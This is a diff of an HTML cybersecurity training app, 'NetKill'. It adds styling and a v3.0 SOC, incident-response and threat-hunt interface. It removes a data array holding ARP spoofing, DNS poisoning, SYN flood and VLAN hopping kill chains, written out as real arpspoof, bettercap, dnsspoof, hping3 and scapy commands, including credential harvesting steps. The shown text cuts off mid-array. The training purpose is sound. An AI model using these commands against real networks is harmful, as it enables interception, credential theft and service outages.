+.sk-fill{height:100%;border-radius:2px;transition:width .6s;}
+.sk-pct{font-size:10px;color:var(--text2);width:28px;text-align:right;font-family:var(--fm);}
+.sk-techs{font-size:10px;color:var(--text3);line-height:1.6;}
+.tools-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(270px,1fr));gap:12px;}
+.tool-card{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:16px;}
+.tool-name{font-family:var(--fh);font-size:15px;color:var(--purple);font-weight:700;margin-bottom:3px;}
+.tool-cat{font-size:10px;color:var(--text3);letter-spacing:1px;text-transform:uppercase;margin-bottom:8px;}
+.tool-desc{font-size:11px;color:var(--text2);line-height:1.5;margin-bottom:10px;}
+.tool-cmd{font-size:10px;background:#060e1a;border:1px solid var(--border);padding:7px 10px;border-radius:4px;color:var(--green);font-family:var(--fm);overflow-x:auto;}
+.m-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.88);z-index:2000;align-items:center;justify-content:center;}
+.m-overlay.open{display:flex;}
+.modal{background:var(--bg2);border:1px solid var(--border2);border-radius:12px;width:90%;max-width:800px;max-height:87vh;overflow-y:auto;padding:28px;position:relative;}
+.m-close{position:absolute;top:16px;right:16px;background:none;border:none;color:var(--text2);cursor:pointer;font-size:20px;transition:.2s;}
+.m-close:hover{color:var(--red);}
+.m-type{font-size:9px;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px;font-family:var(--fh);}
+.m-title{font-family:var(--fh);font-size:18px;font-weight:700;color:#fff;margin-bottom:16px;}
+.ev-lbl{font-size:10px;color:var(--text3);letter-spacing:2px;text-transform:uppercase;margin-bottom:8px;}
+.ev-block{background:#060e1a;border:1px solid var(--border2);border-radius:6px;padding:14px;font-size:11px;line-height:1.75;color:var(--text2);white-space:pre-wrap;max-height:230px;overflow-y:auto;font-family:var(--fm);margin-bottom:18px;}
+.q-text{font-size:13px;color:#fff;margin-bottom:14px;line-height:1.55;}
+.opts{display:flex;flex-direction:column;gap:8px;margin-bottom:18px;}
+.opt{padding:11px 16px;background:var(--bg3);border:1px solid var(--border);color:var(--text);font-family:var(--fb);font-size:12px;text-align:left;cursor:pointer;border-radius:6px;transition:.2s;}
+.opt:hover:not([disabled]){border-color:var(--cyan);color:var(--cyan);}
+.opt.correct{border-color:var(--green);background:rgba(0,255,136,.08);color:var(--green);}
+.opt.wrong{border-color:var(--red);background:rgba(255,48,85,.07);color:var(--red);}
+.exp{background:rgba(0,255,255,.04);border:1px solid rgba(0,255,255,.15);border-radius:8px;padding:16px;font-size:12px;color:var(--text);line-height:1.65;display:none;}
+.exp.show{display:block;}
+.exp-lbl{color:var(--cyan);font-size:10px;letter-spacing:1px;text-transform:uppercase;margin-bottom:8px;font-family:var(--fh);}
+.ir-tabs{display:flex;gap:0;margin-bottom:20px;border:1px solid var(--border);border-radius:8px;overflow:hidden;}
+.ir-tab{flex:1;padding:10px 6px;text-align:center;font-family:var(--fh);font-size:11px;letter-spacing:1px;cursor:pointer;background:var(--bg3);color:var(--text3);border-right:1px solid var(--border);transition:.2s;}
+.ir-tab:last-child{border-right:none;}
+.ir-tab.active{background:rgba(77,166,255,.1);color:var(--blue);}
+.ir-pc{display:none;}
+.ir-pc.show{display:block;}
+.ir-step{background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:14px;margin-bottom:10px;}
+.ir-step-title{font-family:var(--fh);font-size:13px;color:#fff;margin-bottom:8px;}
+.ir-cl{list-style:none;}
+.ir-cl li{display:flex;align-items:flex-start;gap:8px;padding:6px 0;font-size:12px;color:var(--text2);border-bottom:1px solid var(--border);cursor:pointer;}
+.ir-cl li:last-child{border-bottom:none;}
+.ir-cl li::before{content:'□';color:var(--text3);font-size:12px;flex-shrink:0;}
+.ir-cl li.ck{color:var(--green);}
+.ir-cl li.ck::before{content:'✓';color:var(--green);}
+.rule-block{background:#060e1a;border-radius:4px;padding:10px 12px;font-family:var(--fm);font-size:10px;color:var(--text2);line-height:1.7;margin-top:8px;}
+.rule-snort{border-left:3px solid var(--red);}
+.rule-sigma{border-left:3px solid var(--amber);}
+.toast{position:fixed;bottom:24px;right:24px;padding:12px 20px;border-radius:6px;font-size:12px;letter-spacing:1px;z-index:9000;transform:translateY(80px);opacity:0;transition:all .3s;border-left:3px solid;font-family:var(--fh);}
+.toast.success{background:rgba(0,255,136,.08);border-color:var(--green);color:var(--green);}
+.toast.info{background:rgba(0,255,255,.08);border-color:var(--cyan);color:var(--cyan);}
+.toast.show{transform:translateY(0);opacity:1;}
+
+.hunt-card{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:18px;cursor:pointer;transition:all .25s;}
+.hunt-card:hover{border-color:var(--green);box-shadow:0 6px 24px rgba(0,255,136,.08);}
+.hunt-card.hunted{border-color:rgba(0,255,136,.3);}
+.hunt-tag{font-size:9px;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px;color:var(--green);font-family:var(--fh);}
+.hunt-name{font-family:var(--fh);font-size:15px;font-weight:700;color:#fff;margin-bottom:6px;}
+.hunt-hyp{font-size:11px;color:var(--text2);line-height:1.5;margin-bottom:12px;}
+.hunt-foot{display:flex;justify-content:space-between;align-items:center;margin-top:10px;padding-top:10px;border-top:1px solid var(--border);}
+.hunt-pts{font-size:12px;color:var(--green);font-family:var(--fh);}
+.hunt-steps-modal{margin-top:12px;}
+.hunt-step-block{background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:14px;margin-bottom:10px;}
+.hunt-step-lbl{font-family:var(--fh);font-size:11px;color:var(--green);letter-spacing:1px;text-transform:uppercase;margin-bottom:8px;}
+.hunt-step-body{font-size:12px;color:var(--text2);line-height:1.7;white-space:pre-wrap;}
+.hunt-query{background:#060e1a;border:1px solid var(--border2);border-left:3px solid var(--green);border-radius:4px;padding:12px;font-family:var(--fm);font-size:10px;color:#7aff7a;line-height:1.7;margin-top:8px;white-space:pre-wrap;}
+.hunt-cl{list-style:none;margin-top:10px;}
+.hunt-cl li{display:flex;align-items:flex-start;gap:8px;padding:7px 0;font-size:12px;color:var(--text2);border-bottom:1px solid var(--border);cursor:pointer;}
+.hunt-cl li:last-child{border-bottom:none;}
+.hunt-cl li::before{content:"□";color:var(--text3);font-size:12px;flex-shrink:0;}
+.hunt-cl li.ck{color:var(--green);}
+.hunt-cl li.ck::before{content:"✓";color:var(--green);}
+.exp-btn{margin-top:14px;padding:10px 18px;background:rgba(0,255,136,.08);border:1px solid var(--green);color:var(--green);font-family:var(--fh);font-size:12px;letter-spacing:1px;cursor:pointer;border-radius:4px;text-transform:uppercase;transition:.2s;}
+.exp-btn:hover{background:rgba(0,255,136,.15);}
+@media(max-width:960px){.stat-row{grid-template-columns:1fr 1fr 1fr;}.det-grid{grid-template-columns:1fr;}.dash-panels{grid-template-columns:1fr;}}
+@media(max-width:600px){.view{padding:16px;}.stat-row{grid-template-columns:1fr;}}
 </style>
 </head>
 <body>
-
-<div class="modal-overlay active" id="modal">
-  <div class="modal">
-    <h2>⚠ EDUCATIONAL USE ONLY</h2>
-    <p>NetKill is a <strong>browser-based simulation tool</strong>. All scenarios run inside a fictional lab environment. No real networks are scanned, probed, or attacked in any way.</p>
-    <p>Performing unauthorized network attacks is <strong>illegal</strong> under the Computer Fraud and Abuse Act (CFAA), India's IT Act 2000, and equivalent laws worldwide.</p>
-    <p class="warn">Only test systems you own or have explicit written permission to test.</p>
-    <button class="modal-close" onclick="document.getElementById('modal').classList.remove('active')">ENTER THE LAB →</button>
+<div id="topbar">
+  <div class="logo" onclick="showView('dashboard')">
+    <div class="logo-icon">NK</div>
+    <div><div class="logo-name">NET<span>KILL</span></div><div class="logo-ver">CYBER RANGE v3.0</div></div>
+  </div>
+  <button class="nav-btn active" onclick="showView('dashboard')">⬡ Dashboard</button>
+  <button class="nav-btn" onclick="showView('scenarios')">⚔ Scenarios</button>
+  <button class="nav-btn" onclick="showView('arena')">🛡 SOC Arena</button>
+  <button class="nav-btn" onclick="showView('ir')">◉ IR Playbooks</button>
+  <button class="nav-btn" onclick="showView('skillmap')">◎ Skill Map</button>
+  <button class="nav-btn" onclick="showView('tools')">⚙ Tools</button>
+  <button class="nav-btn" onclick="showView('hunt')">🔍 Hunt Lab</button>
+  <div class="topbar-right">
+    <div class="xp-wrap"><span class="xp-lbl" id="topXpTxt">0 XP</span><div class="xp-bar"><div class="xp-fill" id="topXpFill" style="width:0%"></div></div></div>
+    <div class="rank-pill" id="rankPill">RECRUIT</div>
+    <button onclick="exportProgress()" style="padding:4px 10px;background:rgba(0,255,136,.08);border:1px solid rgba(0,255,136,.25);color:var(--green);font-family:var(--fh);font-size:10px;cursor:pointer;border-radius:3px;letter-spacing:1px;">⬇ EXPORT</button>
+    <button onclick="importProgress()" style="padding:4px 10px;background:rgba(77,166,255,.08);border:1px solid rgba(77,166,255,.25);color:var(--blue);font-family:var(--fh);font-size:10px;cursor:pointer;border-radius:3px;letter-spacing:1px;">⬆ IMPORT</button>
+    <div class="live-dot"><span></span><label>LIVE</label></div>
   </div>
 </div>
-
-<header>
-  <div class="header-inner">
-    <div class="logo">
-      <div class="logo-skull">☠</div>
-      <div class="logo-text">
-        <h1>NETKILL</h1>
-        <p>NETWORK ATTACK LAB // v1.1.0</p>
-      </div>
-    </div>
-    <div class="header-right">
-      <div class="hbadge hbg"><span class="sdot"></span>LAB ONLINE</div>
-      <div class="hbadge hba" onclick="document.getElementById('modal').classList.add('active')">⚠ LEGAL</div>
-    </div>
+<div id="app">
+<div id="view-dashboard" class="view active">
+  <div class="sec-hdr"><div class="sec-title">Operator Dashboard</div><span class="sec-sub" id="dashDate"></span></div>
+  <div class="stat-row">
+    <div class="stat-card sc-c"><div class="stat-lbl">Scenarios Cleared</div><div class="stat-val" id="s1">0</div><div class="stat-note">of 27 missions</div><div class="stat-ico">⚔</div></div>
+    <div class="stat-card sc-g"><div class="stat-lbl">SOC Challenges</div><div class="stat-val" id="s2">0</div><div class="stat-note">of 13 challenges</div><div class="stat-ico">🛡</div></div>
+    <div class="stat-card sc-a"><div class="stat-lbl">IR Steps Done</div><div class="stat-val" id="s3">0</div><div class="stat-note">across playbooks</div><div class="stat-ico">◉</div></div>
+    <div class="stat-card" style="background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:20px;position:relative;overflow:hidden;"><div style="position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--green),transparent)"></div><div class="stat-lbl">Hunts Complete</div><div class="stat-val" id="s5">0</div><div class="stat-note">of 5 hunt exercises</div><div class="stat-ico">🔍</div></div>
+    <div class="stat-card sc-r"><div class="stat-lbl">Total XP</div><div class="stat-val" id="s4">0</div><div class="stat-note">Next: <span id="nextRN">Analyst I</span></div><div class="stat-ico">◈</div></div>
   </div>
-</header>
-
-<div class="main">
-
-  <div class="panel">
-    <div class="panel-header ph-red"><div class="pdot pd-r"></div><h3>Attack Vectors</h3></div>
-    <div class="attack-list" id="atkList"></div>
+  <div class="xp-card">
+    <div class="xp-row"><span class="xp-level">Level <span id="xpLvl">1</span> — <span id="xpRank">Recruit</span></span><span class="xp-next" id="xpNextTxt">0 / 500 XP</span></div>
+    <div class="xp-main"><div class="xp-main-fill" id="xpMainFill" style="width:0%"></div></div>
   </div>
-
-  <div class="center">
-    <div class="panel">
-      <div class="panel-header ph-red"><div class="pdot pd-r"></div><h3>Network Topology — Lab Environment</h3></div>
-      <div class="canvas-wrap">
-        <canvas id="nc"></canvas>
-        <div class="cv-label" id="cvLabel">SELECT AN ATTACK TO BEGIN</div>
-      </div>
-      <div class="lab-ctrl">
-        <button class="btn-launch" id="launchBtn" onclick="launchAttack()" disabled>⚡ LAUNCH ATTACK</button>
-        <button class="btn-reset" onclick="resetLab()">↺ RESET</button>
-        <div class="prog-bar"><div class="prog-fill" id="progFill"></div></div>
-        <span class="prog-pct" id="progPct">0%</span>
-      </div>
-    </div>
-
-    <div class="panel">
-      <div class="panel-header ph-green"><div class="pdot pd-g"></div><h3>Live Packet Forge</h3></div>
-      <div class="pkt-display" id="pktDisplay"><div class="pkt-empty">// Select an attack to see real packet structure</div></div>
-    </div>
-
-    <div class="panel" style="flex:1;overflow:hidden;display:flex;flex-direction:column;">
-      <div class="panel-header ph-orange"><div class="pdot pd-o"></div><h3>Kill Chain — Step by Step</h3></div>
-      <div class="chain-body" id="chainBody" style="flex:1;overflow-y:auto;">
-        <div class="welcome">
-          <div class="w-arrow">←</div>
-          <h2>SELECT AN ATTACK</h2>
-          <p>Choose a network attack to see the full attacker kill chain with real commands.</p>
-        </div>
-      </div>
-    </div>
+  <div class="dash-panels">
+    <div class="panel"><div class="panel-title">Recent Activity</div><div id="actFeed">
+      <div class="act-item"><div class="act-dot" style="background:var(--cyan)"></div><div><div class="act-text">NetKill v3.0 range initialised</div><div class="act-time">Session started</div></div></div>
+      <div class="act-item"><div class="act-dot" style="background:var(--amber)"></div><div><div class="act-text">22 attack scenarios loaded — MITRE ATT&amp;CK v14</div><div class="act-time">All kill chains mapped</div></div></div>
+      <div class="act-item"><div class="act-dot" style="background:var(--blue)"></div><div><div class="act-text">5 IR playbooks online with Snort + Sigma rules</div><div class="act-time">Incident response workflows ready</div></div></div>
+      <div class="act-item"><div class="act-dot" style="background:var(--green)"></div><div><div class="act-text">13 SOC challenges · 7 IR Playbooks · 5 Hunt exercises</div><div class="act-time">Full defensive suite active</div></div></div>
+    </div></div>
+    <div class="panel"><div class="panel-title">Recommended Missions</div><div id="recMissions"></div></div>
   </div>
-
-  <div class="right">
-    <div class="panel">
-      <div class="panel-header ph-red"><div class="pdot pd-r"></div><h3>Attack Metrics</h3></div>
-      <div class="score-grid">
-        <div class="sc"><div class="sc-l">Impact</div><div class="sc-v red" id="sImpact">—</div></div>
-        <div class="sc"><div class="sc-l">Stealth</div><div class="sc-v green" id="sStealth">—</div></div>
-        <div class="sc"><div class="sc-l">Complexity</div><div class="sc-v amber" id="sComplex">—</div></div>
-        <div class="sc"><div class="sc-l">Layer</div><div class="sc-v cyan" id="sLayer">—</div></div>
-      </div>
+</div>
+<div id="view-scenarios" class="view">
+  <div id="scen-list">
+    <div class="sec-hdr"><div class="sec-title">Attack Scenarios</div><span class="sec-sub">22 MISSIONS · MITRE ATT&amp;CK v14</span></div>
+    <div class="filter-row">
+      <input class="s-input" type="text" placeholder="Search scenarios..." oninput="filterScen(this.value)">
+      <button class="f-btn on" onclick="filterTactic('all',this)">ALL</button>
+      <button class="f-btn" onclick="filterTactic('Initial Access',this)">INITIAL ACCESS</button>
+      <button class="f-btn" onclick="filterTactic('Lateral Movement',this)">LATERAL</button>
+      <button class="f-btn" onclick="filterTactic('Credential Access',this)">CREDENTIALS</button>
+      <button class="f-btn" onclick="filterTactic('Exfiltration',this)">EXFILTRATION</button>
+      <button class="f-btn" onclick="filterTactic('Impact',this)">IMPACT</button>
     </div>
-    <div class="panel">
-      <div class="panel-header ph-cyan"><div class="pdot pd-c"></div><h3>MITRE ATT&CK Mapping</h3></div>
-      <div class="mitre-body" id="mitreBody"><span style="font-family:var(--mono);font-size:0.62rem;color:#1a1a1a">Select an attack...</span></div>
-    </div>
-    <div class="panel">
-      <div class="panel-header ph-amber"><div class="pdot pd-a"></div><h3>Attacker Toolkit</h3></div>
-      <div class="tool-body" id="toolBody"><span style="font-family:var(--mono);font-size:0.62rem;color:#1a1a1a">No attack selected...</span></div>
-    </div>
-    <div class="panel" style="flex:1">
-      <div class="panel-header ph-green"><div class="pdot pd-g"></div><h3>Detection Log</h3></div>
-      <div class="log-body" id="logBody">
-        <div class="log-e info">[SYS] Lab environment initialized</div>
-        <div class="log-e info">[SYS] All nodes nominal — awaiting simulation</div>
-      </div>
-    </div>
+    <div class="scen-grid" id="scenGrid"></div>
   </div>
-
+  <div id="scen-detail" style="display:none"></div>
+</div>
+<div id="view-arena" class="view">
+  <div class="sec-hdr"><div class="sec-title">SOC Arena</div><span class="sec-sub">DEFENSIVE CHALLENGES</span></div>
+  <div class="arena-grid" id="arenaGrid"></div>
+</div>
+<div id="view-ir" class="view">
+  <div class="sec-hdr"><div class="sec-title">IR Playbooks</div><span class="sec-sub">INCIDENT RESPONSE + DETECTION RULES</span></div>
+  <div class="ir-grid" id="irGrid"></div>
+</div>
+<div id="view-skillmap" class="view">
+  <div class="sec-hdr"><div class="sec-title">Skill Map</div><span class="sec-sub">MITRE ATT&amp;CK COVERAGE</span></div>
+  <div class="sm-grid" id="smGrid"></div>
+</div>
+<div id="view-tools" class="view">
+  <div class="sec-hdr"><div class="sec-title">Tools Reference</div><span class="sec-sub">OFFENSIVE &amp; DEFENSIVE TOOLKIT</span></div>
+  <div class="filter-row" id="toolsFilter"></div>
+  <div class="tools-grid" id="toolsGrid"></div>
+</div>
 </div>
 
-<footer>
-  <span>NETKILL v1.1.0 · Offline-First · Zero Dependencies · Educational Use Only. © 2025 Irfan M</span>
-  <span class="fl">⚠ Unauthorized network attacks are illegal. Simulation only.</span>
-  <span>github.com/irfanm46/netkill</span>
-</footer>
-
+<div id="view-hunt" class="view">
+  <div class="sec-hdr">
+    <div class="sec-title">Threat Hunt Lab</div>
+    <span class="sec-sub">5 HUNTS · HYPOTHESIS-DRIVEN · MITRE ATT&CK ALIGNED</span>
+  </div>
+  <div style="background:rgba(0,255,255,.04);border:1px solid rgba(0,255,255,.15);border-radius:8px;padding:14px 18px;margin-bottom:20px;font-size:12px;color:var(--text2);line-height:1.7;">
+    <span style="color:var(--cyan);font-family:var(--fh);letter-spacing:1px;font-size:11px;">HUNT METHODOLOGY</span><br>
+    Each exercise follows a structured approach: <strong style="color:var(--text)">Hypothesis → Data Sources → Hunt Query → Expected IOCs → ATT&CK Mapping</strong>. 
+    Use the provided KQL/SPL queries in your SIEM, analyse the evidence, then mark each step complete to earn XP.
+  </div>
+  <div class="ir-grid" id="huntGrid"></div>
+</div>
+<div class="m-overlay" id="modal"><div class="modal"><button class="m-close" onclick="closeModal()">✕</button><div id="modalBody"></div></div></div>
+<div class="toast" id="toast"></div>
 <script>
-const ATTACKS=[
-{id:'arp',name:'ARP Spoofing',sub:'Gateway Poisoning',layer:'L2',impact:9,stealth:7,complex:'MED',layerLabel:'Data Link',color:'#ff0033',
-mitre:{'Credential Access':['T1557 — MITM','T1040 — Network Sniffing'],'Collection':['T1557.002 — ARP Cache Poisoning']},
-tools:[{i:'🐍',n:'arpspoof',u:'Classic ARP poisoning — dsniff suite'},{i:'🦜',n:'Ettercap',u:'GUI MITM + plugin framework'},{i:'🔥',n:'Bettercap',u:'Modern all-in-one MITM'},{i:'⚗️',n:'Scapy',u:'Custom ARP packet crafting'}],
-packets:[{layer:'ETH',fields:{dst:'ff:ff:ff:ff:ff:ff',src:'de:ad:be:ef:00:01',type:'0x0806 (ARP)'}},{layer:'ARP',fields:{op:'2 (REPLY)',sha:'de:ad:be:ef:00:01',spa:'192.168.1.1  ← FORGED GATEWAY IP',tha:'aa:bb:cc:dd:ee:ff',tpa:'192.168.1.45'}}],
-phases:[
-{label:'PHASE 1 — RECONNAISSANCE',steps:[
-{t:'Network Discovery',d:'Identify live hosts, gateway IP, and victim MAC on local subnet.',cmd:'nmap -sn 192.168.1.0/24\narp -a'},
-{t:'ARP Table Inspection',d:'Map current IP→MAC relationships before poisoning — know what normal looks like.',cmd:'arp -a\nip neigh show'}]},
-{label:'PHASE 2 — WEAPONIZATION',steps:[
-{t:'Enable IP Forwarding',d:'Forward packets transparently — victim stays connected while you intercept everything.',cmd:'echo 1 > /proc/sys/net/ipv4/ip_forward'},
-{t:'Craft Poison Packets',d:'Forge ARP REPLY: tell victim "I am the gateway" and gateway "I am the victim". Both update ARP cache.',cmd:''}]},
-{label:'PHASE 3 — EXPLOITATION',steps:[
-{t:'Launch ARP Poison',d:'Continuously flood both targets with forged ARP replies. Must be continuous — caches expire every 20-60s.',cmd:'arpspoof -i eth0 -t 192.168.1.45 192.168.1.1\narpspoof -i eth0 -t 192.168.1.1 192.168.1.45'},
-{t:'Capture Traffic',d:"All victim traffic routes through you before reaching gateway. You're invisible in the middle.",cmd:'tcpdump -i eth0 -w capture.pcap host 192.168.1.45'}]},
-{label:'PHASE 4 — POST-EXPLOITATION',steps:[
-{t:'Credential Harvest',d:'Strip credentials from HTTP, FTP, Telnet, IMAP, POP3 in plaintext.',cmd:'ettercap -T -r capture.pcap\nstrings capture.pcap | grep -i "pass\\|user"'},
-{t:'SSL Strip',d:'Downgrade HTTPS to HTTP. Victim sees unlocked padlock. You see plaintext passwords.',cmd:'bettercap -iface eth0 -eval "arp.spoof on; http.proxy on"'}]}],
-detLogs:[{t:'warn',m:'[ARP] Duplicate IP: 192.168.1.1 claims 2 different MAC addresses'},{t:'alert',m:'[IDS] ARP storm: 1200 gratuitous replies/sec from 192.168.1.99'},{t:'warn',m:'[NET] Gateway MAC changed: aa:bb:cc → de:ad:be:ef'},{t:'alert',m:'[SOC] MITM indicator: ARP cache poisoning pattern confirmed'}],
-nodes:['attacker','victim','gateway','internet'],flow:'arp'},
-
-{id:'dns',name:'DNS Poisoning',sub:'Cache Injection',layer:'L7',impact:8,stealth:9,complex:'HIGH',layerLabel:'Application',color:'#cc00ff',
-mitre:{'Initial Access':['T1189 — Drive-by Compromise'],'Collection':['T1040 — Network Sniffing','T1185 — Session Hijack'],'Defense Evasion':['T1557 — MITM']},
-tools:[{i:'🎭',n:'dnsspoof',u:'DNS response spoofing'},{i:'🔥',n:'Bettercap',u:'dns.spoof module'},{i:'👹',n:'Responder',u:'LLMNR/NBT-NS/DNS poisoning'},{i:'⚗️',n:'Scapy',u:'Custom DNS packet crafting'}],
-packets:[{layer:'UDP',fields:{src:'192.168.1.99:53',dst:'192.168.1.45:54321',broadcast:'no — targeted response'}},{layer:'DNS',fields:{id:'0xABCD (matches victim query)','qr':'1 (RESPONSE)',aa:'1 (Authoritative — lie)',qname:'bank.com',qtype:'A',rdata:'192.168.1.99  ← ATTACKER IP'}}],
-phases:[
-{label:'PHASE 1 — POSITIONING',steps:[
-{t:'Establish MITM',d:'DNS poisoning requires intercepting queries. Get on-path via ARP spoof first.',cmd:'bettercap -iface eth0 -eval "arp.spoof on; net.probe on"'},
-{t:'Identify DNS Server',d:"Find victim's DNS resolver — usually the gateway or ISP resolver.",cmd:"cat /etc/resolv.conf\nnmap -sU -p53 192.168.1.1"}]},
-{label:'PHASE 2 — SPOOF SETUP',steps:[
-{t:'Create Fake DNS Entries',d:'Map target domains to your malicious IP where your cloned site runs.',cmd:'# hosts.txt\n192.168.1.99  bank.com\n192.168.1.99  paypal.com\n192.168.1.99  mail.google.com'},
-{t:'Deploy Cloned Site',d:'Clone target website to capture credentials from redirected victims.',cmd:'python3 -m http.server 80\n# or SET (Social Engineering Toolkit) for full clones'}]},
-{label:'PHASE 3 — INJECTION',steps:[
-{t:'Race the Resolver',d:'Watch for DNS queries. Reply with forged answer before legitimate resolver. First reply wins — victim uses your IP.',cmd:'dnsspoof -i eth0 -f hosts.txt'},
-{t:'Kaminsky Cache Poisoning',d:'Inject forged records directly into resolver cache. Persists until TTL expires — hours of access.',cmd:'bettercap -eval "dns.spoof.domains bank.com,paypal.com; dns.spoof on"'}]},
-{label:'PHASE 4 — HARVEST',steps:[
-{t:'Credential Capture',d:'Victims browse your clone believing it is legitimate. Capture POST credentials silently.',cmd:"tcpdump -i eth0 port 80 -A | grep -i 'POST\\|password'"},
-{t:'Cache Persistence',d:'Poisoned entries persist until TTL expires (minutes to hours). Victim keeps hitting your server automatically.',cmd:''}]}],
-detLogs:[{t:'info',m:'[DNS] Query: 192.168.1.45 → bank.com (type A)'},{t:'alert',m:'[DNS] Spoofed response: bank.com → 192.168.1.99 (expected 13.225.x.x)'},{t:'warn',m:'[IDS] DNS answer arrived before query reached resolver'},{t:'alert',m:'[SOC] DNS poisoning confirmed — Kaminsky signature'}],
-nodes:['attacker','victim','dns','internet'],flow:'dns'},
-
-{id:'syn',name:'SYN Flood',sub:'TCP DoS Attack',layer:'L4',impact:10,stealth:3,complex:'LOW',layerLabel:'Transport',color:'#ff6600',
-mitre:{'Impact':['T1498 — Network DoS','T1498.001 — Direct Network Flood'],'Resource Dev':['T1583 — Acquire Infrastructure']},
-tools:[{i:'💥',n:'hping3',u:'SYN flood with IP spoofing'},{i:'⚗️',n:'Scapy',u:'Custom TCP SYN packet flood'},{i:'⚡',n:'LOIC',u:'Low Orbit Ion Cannon'},{i:'🤖',n:'Botnet C2',u:'Distributed DDoS coordination'}],
-packets:[{layer:'IP',fields:{src:'RANDOM SPOOFED IPs  ← key technique',dst:'192.0.2.100',ttl:'64',proto:'TCP (6)'}},{layer:'TCP',fields:{sport:'RANDOM 1024-65535',dport:'80',seq:'RANDOM',flags:'SYN only — ACK never comes',window:'65535'}}],
-phases:[
-{label:'PHASE 1 — TARGET ANALYSIS',steps:[
-{t:'Identify Target Service',d:'Find open TCP ports. Web server (80/443) has largest attack surface and most impact.',cmd:'nmap -sS -p 80,443,22 192.0.2.100'},
-{t:'Measure Connection Queue',d:'Default Linux backlog = 128 connections. SYN flood fills this in milliseconds at high rate.',cmd:'ss -lnt | grep :80\nsysctl net.ipv4.tcp_max_syn_backlog'}]},
-{label:'PHASE 2 — WEAPONIZATION',steps:[
-{t:'Configure IP Spoofing',d:'Randomize source IPs — SYN-ACK replies scatter to random hosts on the internet. Target waits 75s for ACK that never comes.',cmd:''},
-{t:'Calculate Required Rate',d:'Rate must exceed: (connection timeout) ÷ (backlog size). Need ~1000+ SYNs/sec to sustain attack on modern Linux.',cmd:''}]},
-{label:'PHASE 3 — FLOOD',steps:[
-{t:'Launch SYN Flood',d:'Target allocates state for each SYN (memory + CPU). Sends SYN-ACK to nobody. Waits. Connection table fills. Legitimate users get rejected.',cmd:'hping3 -S --flood -V -p 80 --rand-source 192.0.2.100'},
-{t:'Distributed Amplification',d:'Botnet or reflectors amplify attack. Spoof victim IP, flood open TCP services — thousands of SYN-ACKs hit victim simultaneously.',cmd:''}]},
-{label:'PHASE 4 — IMPACT',steps:[
-{t:'Service Down',d:'Target drops all new connections. CPU maxes on SYN processing. Legit users timeout. Full DoS confirmed.',cmd:'ss -s\nnetstat -an | grep SYN_RECV | wc -l'},
-{t:'Attribution Resistance',d:'Millions of random spoofed IPs. Looks like traffic from every country. Near-impossible to trace without ISP cooperation.',cmd:''}]}],
-detLogs:[{t:'alert',m:'[NET] Anomaly: 80,000 SYN/sec to port 80 — baseline is ~50/sec'},{t:'alert',m:'[FW] Connection table 99% full — dropping legitimate connections'},{t:'warn',m:'[SYS] TCP backlog overflow — SYN cookies activated'},{t:'alert',m:'[SOC] DDoS confirmed: SYN flood from 15,000+ spoofed IPs'}],
-nodes:['attacker','internet','target','botnet'],flow:'syn'},
-
-{id:'vlan',name:'VLAN Hopping',sub:'Switch Exploitation',layer:'L2',impact:8,stealth:9,complex:'HIGH',layerLabel:'Data Link',color:'#00ffff',
-mitre:{'Lateral Movement':['T1599 — Network Boundary Bridging','T1599.001 — NAT Traversal'],'Discovery':['T1046 — Network Service Discovery']},
-tools:[{i:'🦎',n:'Yersinia',u:'Layer 2 protocol attacks (DTP/STP)'},{i:'⚗️',n:'Scapy',u:'Double-tagged 802.1Q frames'},{i:'🔧',n:'frogger.py',u:'VLAN hopping automation'},{i:'📡',n:'Wireshark',u:'Cross-VLAN capture'}],
-packets:[{layer:'ETH',fields:{dst:'00:00:0c:cc:cc:cc',src:'de:ad:be:ef:00:01',type:'0x8100 (802.1Q)'}},{layer:'802.1Q outer',fields:{pcp:'0',dei:'0',vid:'1  ← attacker native VLAN (stripped by first switch)'}},{layer:'802.1Q inner',fields:{pcp:'0',dei:'0',vid:'10  ← TARGET VLAN (forwarded by second switch)'}},{layer:'IP',fields:{dst:'10.0.10.50  ← host in target VLAN',src:'192.168.1.99'}}],
-phases:[
-{label:'PHASE 1 — ENUMERATION',steps:[
-{t:'Detect DTP',d:'Many Cisco switches run DTP (Dynamic Trunking Protocol) by default — auto-negotiate trunks.',cmd:'yersinia dtp -attack 1\n# Listen for DTP frames — detects trunk-capable ports'},
-{t:'Identify Target VLAN',d:'Map which VLANs hold sensitive assets: VLAN 10 = servers, VLAN 20 = finance, VLAN 30 = guest.',cmd:'nmap --script=broadcast-listener -e eth0'}]},
-{label:'PHASE 2 — SWITCH SPOOFING',steps:[
-{t:'Negotiate Trunk',d:"Send DTP Desirable frames — convince switch your port is another switch's trunk. Switch promotes to trunk mode.",cmd:'yersinia dtp -attack 3'},
-{t:'Receive All VLANs',d:'Once trunked, your NIC gets traffic from ALL VLANs simultaneously. Complete network visibility.',cmd:'ip link add link eth0 name eth0.10 type vlan id 10\nip link set eth0.10 up\ndhclient eth0.10'}]},
-{label:'PHASE 3 — DOUBLE TAGGING',steps:[
-{t:'Craft Double-Tagged Frame',d:'Stack two 802.1Q tags. First switch strips outer tag, forwards inner-tagged frame to target VLAN. Works even without trunk negotiation.',cmd:"python3 -c \"from scapy.all import *\npkt=Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=10)/IP(dst='10.0.10.50')/ICMP()\nsendp(pkt,iface='eth0')\""},
-{t:'One-Way Access',d:'Packets reach target VLAN hosts. Replies need full trunk for return path. Combine with trunk negotiation for full bidirectional access.',cmd:''}]},
-{label:'PHASE 4 — PIVOT',steps:[
-{t:'Lateral Movement',d:'From target VLAN: attack servers, steal credentials, access systems that were supposed to be isolated.',cmd:'nmap -sV 10.0.10.0/24  # Discover previously hidden hosts'},
-{t:'Segmentation Bypass',d:'VLAN isolation defeated. Guest WiFi VLAN can now reach Finance VLAN. Common in enterprises relying on VLANs as only security layer.',cmd:''}]}],
